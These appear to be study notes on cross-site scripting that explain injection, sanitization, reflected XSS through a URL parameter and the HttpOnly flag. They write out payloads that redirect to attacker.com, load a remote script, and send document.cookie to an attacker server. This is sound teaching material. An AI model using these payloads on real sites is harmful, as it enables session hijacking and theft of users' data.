- An XSS vulnerability occurs when attackers can execute custom scripts on a victim’s browser. If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by other users. The victim’s browser will then execute the malicious script, which might steal cookies, leak personal information, change site contents, or redirect the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute.
	<script>alert("Hello!");</script>
	These scripts are the cause of many XSS vulnerabilities. (Besides embedding a script inside the HTML page as an inline script, sites can also load JavaScript code as an external file, like this: <script src="URL_OF_EXTERNAL_SCRIPT"></script>.)
	<script>location="http://attacker.com";</script>

- Validating user input means that the application checks that the user input meets a certain standard—in this case, does not contain malicious JavaScript code. Sanitizing user input, on the other hand, means that the application modifies special characters in the input that can be used to interfere with HTML logic before further processing

- The attacker can also use a different syntax to embed malicious code. 
	- The src attribute of the HTML <script>This piece of malicious code will execute the contents of http://attacker.com/xss.js/ on the victim’s browser during an XSS attack: <script src=http://attacker.com/xss.js></script>


- This example isn’t really exploitable, because attackers have no way of injecting the malicious script on other users’ pages. The most they could do is redirect themselves to the malicious page. But let’s say that the site also allows users to subscribe to the newsletter by visiting the URL https://subscribe.example.com?email=SUBSCRIBER_EMAIL. After users visit the URL, they will be automatically subscribed, and the same confirmation will be shown on the web page. In this case, attackers can inject the script by tricking users into visiting a malicious URL:
	https://subscribe.example.com?email=<script>location="http://attacker.com";</script>
	 Since the malicious script gets incorporated into the page, the victim’s browser will think the script is part of that site. Then the injected script can access any resources that the browser stores for that site, including cookies and session tokens. Attackers can, therefore, use these scripts to steal information and bypass access control. For example, attackers might steal user cookies by making the victim’s browser send a request to the attacker’s IP with the victim’s cookie as a URL parameter:



- attackers can use the XSS to steal other users’ cookies by inspecting incoming requests on their server logs. Note that if the session cookie has the HttpOnly flag set, JavaScript will not be able to read the cookie, and therefore the attacker will not be able to exfiltrate
	<script>image = new Image();
	image.src='http://attacker_server_ip/?c='+document.cookie;</script>
	 XSS can be used to execute actions on the victim’s behalf, modify the web page the victim is viewing, and read the victim’s sensitive information, such as CSRF tokens, credit card numbers, and any other details rendered on their page.

- There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS
-  